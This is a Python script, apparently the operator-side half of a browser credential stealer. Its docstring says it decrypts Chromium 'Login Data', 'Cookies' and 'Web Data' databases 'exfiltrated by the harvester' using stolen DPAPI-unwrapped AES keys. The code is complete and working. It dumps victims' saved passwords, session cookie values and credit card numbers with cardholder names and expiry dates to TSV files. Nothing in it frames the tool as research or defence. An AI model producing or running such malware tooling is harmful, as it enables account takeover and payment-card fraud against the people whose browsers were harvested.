#!/usr/bin/env python3
"""Decrypt raw Chromium artifacts exfiltrated by the harvester.

The agent copies `Login Data`, `Cookies`, `Web Data`, `History`, the SQLite
WAL sidecars and `Local State` without decrypting anything in-process. It also
writes `<browser>__key.txt`: the DPAPI-unwrapped 32-byte AES-256 key in hex.
This tool performs the AES-256-GCM step offline, on the operator side.

Usage:
    pip install cryptography
    python3 decrypt_chromium.py <loot_dir_or_zip> [out_dir]

Outputs `<out_dir>/<browser>__<profile>__<kind>.tsv` and a summary on stdout.
"""

import os
import shutil
import sqlite3
import sys
import tempfile
import zipfile
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    sys.exit("missing dependency: pip install cryptography")


def decrypt(blob, key):
    if blob is None:
        return ""
    if isinstance(blob, str):
        return blob
    if blob[:3] in (b"v10", b"v11"):
        ct = blob[3:]
        if len(ct) < 12 + 16:
            return "[short]"
        try:
            return AESGCM(key).decrypt(ct[:12], ct[12:], None).decode("utf-8", "replace")
        except Exception as exc:
            return f"[fail:{type(exc).__name__}]"
    return "[dpapi-only]"


def with_db(db_path, fn):
    """Open a copy (with its WAL/SHM) so SQLite can recover a snapshot."""
    tmp = Path(tempfile.mkdtemp(prefix="db_"))
    base = Path(db_path).name
    for suffix in ("", "-wal", "-shm"):
        src = Path(str(db_path) + suffix)
        if src.exists():
            shutil.copy2(src, tmp / (base + suffix))
    conn = sqlite3.connect(tmp / base)
    try:
        return fn(conn)
    finally:
        conn.close()
        shutil.rmtree(tmp, ignore_errors=True)


def rows_logins(db, key):
    def run(conn):
        try:
            cur = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
        except sqlite3.Error:
            return []
        return [(o or "", u or "", decrypt(p, key)) for o, u, p in cur]
    return with_db(db, run)


def rows_cookies(db, key):
    def run(conn):
        try:
            cur = conn.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
        except sqlite3.Error:
            return []
        out = []
        for host, name, value, enc in cur:
            out.append((host or "", name or "", value or decrypt(enc, key)))
        return out
    return with_db(db, run)


def rows_cards(db, key):
    def run(conn):
        try:
            cur = conn.execute(
                "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted "
                "FROM credit_cards"
            )
        except sqlite3.Error:
            return []
        out = []
        for who, month, year, enc in cur:
            out.append((who or "", f"{month or 0:02d}/{year or 0}", decrypt(enc, key)))
        return out
    return with_db(db, run)


def write_tsv(path, header, rows):
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as f:
        f.write("\t".join(header) + "\n")
        for row in rows:
            f.write("\t".join(str(c).replace("\t", " ").replace("\n", " ") for c in row) + "\n")


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    src = Path(sys.argv[1])
    out = Path(sys.argv[2]) if len(sys.argv) > 2 else Path("decrypted")

    tmp = None
    if src.is_file() and zipfile.is_zipfile(src):
        tmp = Path(tempfile.mkdtemp(prefix="loot_"))
        with zipfile.ZipFile(src) as z:
            z.extractall(tmp)
        root = tmp
    else:
        root = src

    browsers = root / "browsers"
    if not browsers.is_dir():
        sys.exit(f"no browsers/ directory under {root}")

    keys = {}
    for kf in browsers.glob("*__key.txt"):
        name = kf.name[: -len("__key.txt")]
        try:
            keys[name] = bytes.fromhex(kf.read_text().strip())
        except ValueError:
            pass
    if not keys:
        sys.exit("no *__key.txt found (DPAPI key was not extracted)")
    for name, key in sorted(keys.items()):
        print(f"[key] {name}: {len(key)} bytes")

    out.mkdir(parents=True, exist_ok=True)
    for db in sorted(browsers.iterdir()):
        if not db.is_file():
            continue
        name = db.name
        browser = name.split("__", 1)[0]
        key = keys.get(browser)
        if key is None:
            continue
        low = name.lower()
        if low.endswith("__logindata"):
            rows = rows_logins(db, key)
            write_tsv(out / (name + ".tsv"), ["origin", "username", "password"], rows)
            print(f"[logins] {name}: {len(rows)}")
        elif low.endswith("__cookies"):
            rows = rows_cookies(db, key)
            write_tsv(out / (name + ".tsv"), ["host", "name", "value"], rows)
            print(f"[cookies] {name}: {len(rows)}")
        elif low.endswith("__webdata"):
            rows = rows_cards(db, key)
            write_tsv(out / (name + ".tsv"), ["cardholder", "exp", "number"], rows)
            print(f"[cards] {name}: {len(rows)}")

    ff = list(browsers.glob("firefox__*"))
    if ff:
        print("[firefox] raw profile shipped; decrypt logins.json with an NSS/key4.db tool")
    if tmp:
        shutil.rmtree(tmp, ignore_errors=True)
    print(f"[done] output: {out}")


if __name__ == "__main__":
    main()
